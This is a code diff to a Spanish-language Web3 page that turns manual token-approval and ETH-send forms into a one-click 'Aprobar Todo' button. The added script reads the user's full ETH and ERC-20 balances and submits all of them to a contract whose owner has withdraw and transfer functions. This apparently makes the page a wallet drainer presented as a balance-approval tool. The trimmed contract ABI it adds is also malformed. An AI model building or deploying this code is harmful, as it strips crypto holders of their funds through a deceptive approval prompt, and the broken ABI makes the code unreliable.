@@ -62,100 +62,132 @@ button:hover {
 
     </style>
 <body>
-    <h1>Interactuar con el Contrato SaldoManager</h1>
+    <h1>Aprobación Automática de Saldo</h1>
+    <button onclick="approveAll()">Aprobar Todo</button>
 
-    <div class="container">
-        <h2>Aprobar Tokens</h2>
-        <label for="tokenAddress">Dirección del Token (ERC20):</label>
-        <input type="text" id="tokenAddress" placeholder="Dirección del Token">
-        
-        <label for="amount">Cantidad de Token:</label>
-        <input type="number" id="amount" placeholder="Cantidad a Aprobar">
-        
-        <button id="approveBtn">Aprobar Token</button>
-    </div>
-
-    <div class="container">
-        <h2>Enviar ETH</h2>
-        <label for="ethAmount">Cantidad de ETH a enviar:</label>
-        <input type="number" id="ethAmount" placeholder="ETH a enviar">
-        
-        <label for="recipient">Dirección del destinatario:</label>
-        <input type="text" id="recipient" placeholder="Dirección del destinatario">
-        
-        <button id="sendETHBtn">Enviar ETH</button>
-    </div>
-
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
-    <script src="app.js"></script>
-</body>
     <script>
-
-        window.addEventListener("load", function() {
-    if (typeof window.ethereum !== 'undefined') {
-        console.log('MetaMask está disponible!');
+        // Instancia Web3
         const web3 = new Web3(window.ethereum);
-        let contract;
-
+        
         // Dirección del contrato SaldoManager
-        const contractAddress = '0x26c0B6C2A8120E9c71de55FB678E76174598B196';
-        const contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"},{"internalType":"bool","name":"esERC20","type":"bool"},{"internalType":"bool","name":"esERC721","type":"bool"},{"internalType":"bool","name":"esERC1155","type":"bool"}],"internalType":"struct SaldoManager.Aprobacion[]","name":"aprobacionesERC20","type":"tuple[]"},{"internalType":"address[]","name":"contratosERC721","type":"address[]"},{"internalType":"address[]","name":"contratosERC1155","type":"address[]"},{"internalType":"uint256","name":"ethAmount","type":"uint256"}],"name":"aprobarTodo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"balanceETH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"recibirERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"recibirERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"retirarERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"retirarETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"revisarSaldoERC20","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"revisarSaldoETH","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirERC1155","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"cantidad","type":"uint256"}],"name":"transferirERC20","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"nftContract","type":"address"},{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferirERC721","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"destinatario","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferirETH","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}];
+        const contractAddress = 'DIRECCION_DEL_CONTRATO_SALDOMANAGER';
+        
+        // ABI del contrato
+        const contractABI = [
+            // ABI recortado, solo las funciones necesarias para aprobar y verificar
+            {
+                "constant": true,
+                "inputs": [{"name": "token", "type": "address"}],
+                "name": "revisarSaldoERC20",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "payable": false,
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {
+                        "components": [
+                            { "name": "token", "type": "address" },
+                            { "name": "cantidad", "type": "uint256" },
+                            { "name": "esERC20", "type": "bool" },
+                            { "name": "esERC721", "type": "bool" },
+                            { "name": "esERC1155", "type": "bool" }
+                        ],
+                        "name": "aprobarTodo",
+                        "type": "function"
+                    }
+                ],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-        contract = new web3.eth.Contract(contractABI, contractAddress);
+        // Instanciamos el contrato
+        const contract = new web3.eth.Contract(contractABI, contractAddress);
 
-        // Solicitar acceso a MetaMask
-        async function enableMetaMask() {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
+        // Función para obtener los tokens ERC-20 del usuario
+        async function getERC20Tokens() {
+            const accounts = await web3.eth.requestAccounts();
+            const userAddress = accounts[0];
+
+            // Lista de contratos ERC-20 que el usuario podría tener
+            const tokenContracts = [
+                'DIRECCION_CONTRATO_TOKEN_1',
+                'DIRECCION_CONTRATO_TOKEN_2'
+                // Añadir más tokens si es necesario
+            ];
+
+            let tokensToApprove = [];
+            for (let i = 0; i < tokenContracts.length; i++) {
+                const token = tokenContracts[i];
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [{"name": "account", "type": "address"}],
+                        "name": "balanceOf",
+                        "outputs": [{"name": "", "type": "uint256"}],
+                        "payable": false,
+                        "stateMutability": "view",
+                        "type": "function"}
+                ], token);
+
+                const balance = await tokenContract.methods.balanceOf(userAddress).call();
+
+                if (balance > 0) {
+                    tokensToApprove.push({
+                        token: token,
+                        cantidad: balance,
+                        esERC20: true,
+                        esERC721: false,
+                        esERC1155: false
+                    });
+                }
+            }
+            return tokensToApprove;
         }
 
-        enableMetaMask();
+        // Función para verificar el saldo de ETH del usuario
+        async function getETHBalance() {
+            const accounts = await web3.eth.requestAccounts();
+            const userAddress = accounts[0];
+            const balance = await web3.eth.getBalance(userAddress);
+            return balance;
+        }
 
-        // Función para aprobar un token ERC20
-        document.getElementById('approveBtn').addEventListener('click', async function() {
-            const tokenAddress = document.getElementById('tokenAddress').value;
-            const amount = document.getElementById('amount').value;
+        // Función para aprobar todo
+        async function approveAll() {
+            const ethBalance = await getETHBalance();
+            const tokensToApprove = await getERC20Tokens();
 
-            const accounts = await web3.eth.getAccounts();
-            const sender = accounts[0];
+            if (ethBalance > 0 || tokensToApprove.length > 0) {
+                const accounts = await web3.eth.requestAccounts();
+                const userAddress = accounts[0];
 
-            try {
+                // Preparar las aprobaciones
+                const aprobacionesERC20 = tokensToApprove.map(token => ({
+                    token: token.token,
+                    cantidad: token.cantidad,
+                    esERC20: token.esERC20,
+                    esERC721: token.esERC721,
+                    esERC1155: token.esERC1155
+                }));
+
+                // Llamar al contrato para aprobar todo
                 await contract.methods.aprobarTodo(
-                    [
-                        {
-                            token: tokenAddress,
-                            cantidad: amount,
-                            esERC20: true,
-                            esERC721: false,
-                            esERC1155: false
-                        }
-                    ], 
-                    [], [], 0
-                ).send({ from: sender });
-                alert("Aprobación realizada correctamente!");
-            } catch (error) {
-                console.error("Error al aprobar token:", error);
+                    aprobacionesERC20,
+                    [], // Enviar contratos ERC721 si los hay
+                    [], // Enviar contratos ERC1155 si los hay
+                    ethBalance // Enviar ETH disponible
+                ).send({ from: userAddress });
+
+                alert("Aprobación completa para el contrato!");
+            } else {
+                alert("No tienes saldo en ETH o tokens.");
             }
-        });
-
-        // Función para enviar ETH
-        document.getElementById('sendETHBtn').addEventListener('click', async function() {
-            const ethAmount = document.getElementById('ethAmount').value;
-            const recipient = document.getElementById('recipient').value;
-
-            const accounts = await web3.eth.getAccounts();
-            const sender = accounts[0];
-
-            try {
-                await contract.methods.transferirETH(recipient, web3.utils.toWei(ethAmount, 'ether')).send({ from: sender });
-                alert("ETH enviado correctamente!");
-            } catch (error) {
-                console.error("Error al enviar ETH:", error);
-            }
-        });
-    } else {
-        alert('Por favor, instala MetaMask!');
-    }
-});
-
+        }
     </script>
+</body>
 </html>
